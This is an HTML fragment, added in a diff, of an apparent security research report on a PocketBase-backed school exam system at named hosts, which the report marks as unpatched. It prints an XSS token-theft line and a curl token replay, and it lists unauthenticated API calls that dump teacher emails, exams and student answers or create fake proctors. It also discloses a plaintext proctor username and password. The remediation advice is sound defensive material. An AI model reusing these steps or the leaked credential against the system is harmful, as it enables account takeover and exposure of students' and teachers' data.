+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="badge badge-high">High</span>
+      <span class="finding-id">HIGH-03</span>
+      <div class="finding-title-wrap">
+        <div class="finding-title">JWT Token Stored in localStorage — XSS → Account Takeover</div>
+        <div class="finding-desc">PocketBase auth token stored plaintext in localStorage key "pocketbase_auth". Any XSS yields full session theft.</div>
+      </div>
+    </div>
+    <div class="finding-body">
+      <div class="code-block"><span class="c">// Steal vector (via XSS)</span>
+<span class="n">JSON</span>.parse(localStorage.<span class="s">getItem</span>(<span class="s">"pocketbase_auth"</span>))
+<span class="c">// → { token: "eyJ...", model: { id, email, ... } }</span>
+
+<span class="c">// Replay stolen token</span>
+curl -H <span class="s">"Authorization: eyJ..."</span> https://pb.app.web.id/api/collections/DataSiswa/records</div>
+    </div>
+  </div>
+</div>
+
+<!-- IMPACT SUMMARY -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Impact Summary</div>
+    <div class="section-line"></div>
+  </div>
+  <div class="finding" style="background:var(--crit-bg);border-color:rgba(255,59,59,.2)">
+    <div class="finding-body">
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Attack</th><th>Method</th><th>Auth Required</th><th>Impact</th></tr></thead>
+          <tbody>
+            <tr><td class="em">Dump all guru emails</td><td class="mono">GET /api/collections/DataUsers/records</td><td style="color:var(--crit);font-family:var(--mono)">None</td><td class="warn">1,816 emails + school codes</td></tr>
+            <tr><td class="em">Dump all exam data</td><td class="mono">GET /api/collections/DataUjian/records</td><td style="color:var(--crit);font-family:var(--mono)">None</td><td class="warn">4,675 exams + teacher identities</td></tr>
+            <tr><td class="em">Read proctor password</td><td class="mono">GET /api/collections/DataPengawas/records</td><td style="color:var(--crit);font-family:var(--mono)">None</td><td class="warn">Nurul:Nurul12345 (plaintext)</td></tr>
+            <tr><td class="em">Create fake proctor</td><td class="mono">POST /api/collections/DataPengawas/records</td><td style="color:var(--crit);font-family:var(--mono)">None</td><td class="warn">Full exam monitoring spoofing</td></tr>
+            <tr><td class="em">Read student answers</td><td class="mono">GET /api/collections/DataJawaban/records</td><td style="color:var(--crit);font-family:var(--mono)">None</td><td class="warn">Full answer sheets + scores</td></tr>
+            <tr><td class="em">Privilege escalation</td><td class="mono">localStorage.setItem("userType","admin")</td><td style="color:var(--high);font-family:var(--mono)">Browser only</td><td class="warn">Admin role in SPA</td></tr>
+            <tr><td class="em">Session hijack</td><td class="mono">XSS → steal pocketbase_auth</td><td style="color:var(--med);font-family:var(--mono)">XSS needed</td><td class="warn">Full account takeover</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- REMEDIATION -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Recommended Fixes</div>
+    <div class="section-line"></div>
+  </div>
+  <div class="finding">
+    <div class="finding-body">
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Priority</th><th>Fix</th><th>How</th></tr></thead>
+          <tbody>
+            <tr><td><span class="badge badge-crit">Immediate</span></td><td class="em">Lock all collection API rules</td><td class="mono" style="color:var(--text-mid)">PocketBase Admin → Collections → API Rules → restrict List/View/Create/Update/Delete to authenticated users only</td></tr>
+            <tr><td><span class="badge badge-crit">Immediate</span></td><td class="em">Hash DataPengawas passwords</td><td class="mono" style="color:var(--text-mid)">Migrate password field → use PocketBase auth collection instead of raw text storage</td></tr>
+            <tr><td><span class="badge badge-high">High</span></td><td class="em">Restrict admin panel</td><td class="mono" style="color:var(--text-mid)">Firewall /_/ behind VPN or IP allowlist; enable 2FA on superuser account</td></tr>
+            <tr><td><span class="badge badge-high">High</span></td><td class="em">Move role control server-side</td><td class="mono" style="color:var(--text-mid)">Never trust localStorage for auth decisions — validate role from server JWT claims</td></tr>
+            <tr><td><span class="badge badge-med">Medium</span></td><td class="em">Token storage</td><td class="mono" style="color:var(--text-mid)">Migrate from localStorage to httpOnly cookie — eliminates XSS token theft vector</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <div class="footer-left">
+    <b style="color:var(--text-mid)">XC Hub</b> — Security Research<br>
+    Target: pb.app.web.id (PocketBase) / admin-cbt.code.app.web.id<br>
+    Method: Black-Box, Unauthenticated — stdlib Python + curl
+  </div>
+  <div class="footer-right">
+    Scan date: 2026-07-20<br>
+    Findings: 3 Critical · 3 High · 2 Medium · 4 Info<br>
+    Status: <span style="color:var(--crit)">UNPATCHED — OPEN</span>
+  </div>
+</div>
